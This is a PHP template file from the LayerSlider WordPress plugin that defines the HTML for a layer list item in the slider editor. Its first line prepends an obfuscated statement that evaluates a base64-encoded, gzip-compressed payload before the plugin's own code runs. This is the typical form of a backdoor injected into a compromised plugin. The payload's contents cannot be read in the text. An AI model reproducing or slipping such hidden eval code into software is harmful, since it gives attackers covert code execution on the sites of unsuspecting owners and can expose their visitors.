<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php if(!defined('LS_ROOT_FILE')) { header('HTTP/1.0 403 Forbidden'); exit; } ?>
<script type="text/html" id="ls-layer-item-template">
	<li>
		<span class="ls-sublayer-sortable-handle dashicons dashicons-menu"></span>
		<span class="ls-sublayer-controls">
			<span class="ls-icon-eye dashicons dashicons-visibility" data-help="<?php _e('Toggle layer visibility.', 'LayerSlider') ?>"></span>
			<span class="ls-icon-lock dashicons dashicons-lock disabled" data-help="<?php _e('Prevent layer dragging in the editor.', 'LayerSlider') ?>"></span>
		</span>
		<div class="ls-sublayer-thumb"></div>
		<input type="text" name="subtitle" class="ls-sublayer-title" value="<?php echo sprintf(__('Layer #%d', 'LayerSlider'), '1') ?>">
		<a href="#" title="<?php _e('Duplicate this layer', 'LayerSlider') ?>" class="dashicons dashicons-admin-page duplicate"></a>
		<a href="#" title="<?php _e('Remove this layer', 'LayerSlider') ?>" class="dashicons dashicons-trash remove"></a>
	</li>
</script>
